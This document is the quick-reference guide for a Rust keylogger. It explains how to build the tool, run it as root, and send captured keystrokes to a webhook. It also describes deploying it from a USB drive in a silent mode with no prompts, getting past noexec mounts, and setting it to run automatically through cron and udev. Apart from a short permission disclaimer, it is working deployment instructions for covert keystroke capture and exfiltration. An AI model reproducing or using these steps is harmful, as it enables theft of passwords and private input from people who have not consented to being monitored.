# Quick Reference Guide

## Testing Webhook Connectivity

Test if your webhook URL is working before running the keylogger:

```bash
./test_webhook.sh https://webhook.site/your-unique-id
```

## Running the Keylogger

### Basic Usage (No Webhook)
```bash
# Local logging only
sudo ./target/release/rust-key
```

### With Webhook Support
```bash
# Logs locally and sends to webhook
sudo ./target/release/rust-key https://webhook.site/your-unique-id
```

## USB Deployment

### Interactive Mode (Recommended for Manual Use)
Best when you want prompts and safety confirmations:

```bash
./usb_autorun.sh
```

Features:
- User confirmation prompt
- Educational demonstration
- Sudo permission request
- Webhook URL prompt
- Creates stop script

### Silent Mode (For Automation)
Best for scripted/automated deployment:

```bash
# Without webhook
sudo ./usb_autorun_silent.sh

# With webhook
sudo ./usb_autorun_silent.sh https://webhook.site/your-unique-id
```

Features:
- No prompts or interaction
- Requires root upfront
- Accepts webhook as argument
- Creates PID file and stop script

## Stopping the Keylogger

If using USB autorun scripts, a stop script is automatically created:

```bash
# Using the auto-generated stop script (from USB root)
./stop_keylogger.sh

# Or manually by PID
PID=$(cat logs/keylogger.pid)
sudo kill $PID
```

## Common Tasks

### Build the Project
```bash
cargo build --release
```

### Copy to USB Drive
```bash
USB_MOUNT="/run/media/$USER/MYUSB"  # Adjust this
cp target/release/rust-key $USB_MOUNT/
cp usb_autorun.sh $USB_MOUNT/         # Interactive mode
cp usb_autorun_silent.sh $USB_MOUNT/  # Silent mode (optional)
cp test_webhook.sh $USB_MOUNT/        # Webhook tester (optional)
```

### View Logs
```bash
# If running locally
tail -f keylog.txt

# If running from USB
tail -f /path/to/usb/logs/keylog.txt
```

## Troubleshooting

### Permission Denied
```bash
# Add user to input group
sudo usermod -a -G input $USER
# Then log out and log back in

# Or just use sudo
sudo ./target/release/rust-key
```

### No Input Devices Found
Make sure you have proper permissions:
```bash
ls -la /dev/input/event*
sudo ./target/release/rust-key
```

### Webhook Not Working
1. Test the webhook first:
   ```bash
   ./test_webhook.sh https://your-webhook-url
   ```
2. Check that the URL starts with `http://` or `https://`
3. Verify the webhook service is online

### USB Script Won't Execute
- Check if USB is mounted with `noexec`:
  ```bash
  mount | grep usb
  ```
- The scripts handle this automatically by copying to `/tmp`
- Or use the silent mode which handles it

## Security Notes

- Always use HTTPS webhooks to encrypt data
- Secure log files with proper permissions
- Delete logs when no longer needed
- Only use on systems you own or have permission to monitor
- Be aware of local laws regarding keylogging

## Documentation

- **README.md** - Full documentation and features
- **USB_SETUP.md** - Detailed USB deployment guide
- **CRONTAB_SETUP.md** - Automated execution with cron
- **99-usb-autorun.rules.example** - udev rules for USB detection
- **TESTING.md** - Testing procedures
- **QUICKSTART.md** - Quick start guide
